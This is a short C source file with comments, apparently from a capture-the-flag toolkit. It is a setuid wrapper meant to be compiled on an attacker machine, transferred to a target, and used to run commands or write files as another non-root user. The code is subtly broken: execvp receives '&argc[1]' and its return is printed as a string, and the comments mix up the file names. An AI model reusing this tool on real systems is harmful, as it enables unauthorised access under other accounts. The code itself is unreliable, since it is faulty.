#include <stdio.h>
#include <unistd.h>

int main(int argc, const char * argv[]){
  if (argc > 1) printf("%s",execvp(argv[1], &argc[1]));
  return 0;
}

/*
Useful to execute commands as other users that are NOT root. because it assumes the effective user ID of a different non-root user.  This is explained in more detail at the end of the Ippsec Jail video.
On attacker machine before transfer:
	64 bit: gcc SETUID_Cmd.c -o SETUID_Cmd
	32 bit: gcc SETUID_Bash.c -m32 -o SETUID_Bash -----Note you need gcc-multilib installed to do this option.
	chmod 6755 SETUID_Cmd
    4 (set UID) + 2 (set GID)
	Chown [UID]:[GID] SETUID_Cmd
		- Or whatever UID:GID we elevate to.
  ./SETUID_Cmd [command we want to execute as the effective UID GID that we changed the owner to]
  - We can also create a file as the UID and GID that we assigned as owner of the SETUID_Cmd binary by:
  echo "TEST" | ./SETUID_Cmd tee /file/location/to/create/file
*/
